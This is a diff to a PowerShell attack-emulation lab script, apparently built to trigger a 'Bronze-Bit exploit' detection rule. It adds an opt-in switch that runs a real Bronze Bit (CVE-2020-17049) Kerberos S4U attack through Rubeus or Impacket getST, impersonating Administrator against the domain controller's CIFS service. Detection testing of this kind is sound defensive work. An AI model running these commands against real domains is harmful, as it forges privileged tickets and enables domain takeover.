@@ -15,10 +15,12 @@
     Kerberos delegation traffic but not the forged-forwardable flag. Drop the
     helper path below to run the real exploit.
 #>
-param([switch]$DryRun)
+param([switch]$DryRun,[switch]$EnableRealExploits)
 . "$PSScriptRoot\..\config\lab-config.ps1"
+. "$PSScriptRoot\_exploit.ps1"
 $cfg = $Global:EalDemo
 if ($DryRun) { $cfg.DryRun = $true }
+if ($EnableRealExploits) { $cfg.EnableRealExploits = $true }
 
 Write-Stage "STAGE 6 (Credential Access): Kerberos delegation / S4U traffic to $($cfg.DomainController)" "INFO"
 Add-Type -AssemblyName System.IdentityModel -ErrorAction SilentlyContinue
@@ -36,5 +38,21 @@ foreach ($spn in $spns) {
 $helper = Join-Path $PSScriptRoot "tools\Rubeus.exe"
 if (Test-Path $helper) { Write-Stage "  Rubeus found - real exploit: $helper s4u /bronzebit ..." "INFO" }
 else { Write-Stage "  (For the real Bronze Bit, place Rubeus.exe/impacket in scripts\tools\)" "INFO" }
+
+# Opt-in: forge the forwardable ticket via an operator-supplied tool. Rubeus runs
+# the S4U + Bronze-Bit (CVE-2020-17049) chain; Impacket getST needs creds/hash the
+# operator supplies (documented in README/checklist, nothing hardcoded here).
+Invoke-RealExploit -Name 'Bronze Bit (S4U / CVE-2020-17049)' `
+    -ToolCandidates @('Rubeus.exe','getST.exe') `
+    -TrafficNote 'Kerberos S4U/delegation ticket requests were sent.' `
+    -Run {
+        param($t)
+        if ($t -match 'Rubeus') {
+            & $t s4u /impersonateuser:Administrator "/msdsspn:cifs/$($cfg.DomainController)" /bronzebit /ptt
+        } else {
+            # NOTE: Impacket getST needs the service account creds/hash the operator supplies.
+            & $t -spn "cifs/$($cfg.DomainController)" -impersonate Administrator -force-forwardable "$($cfg.Domain)/"
+        }
+    }
 
 Write-Stage "STAGE 6 done. Expect EAL: 'Bronze-Bit exploit' (rule 115c6f43)." "OK"
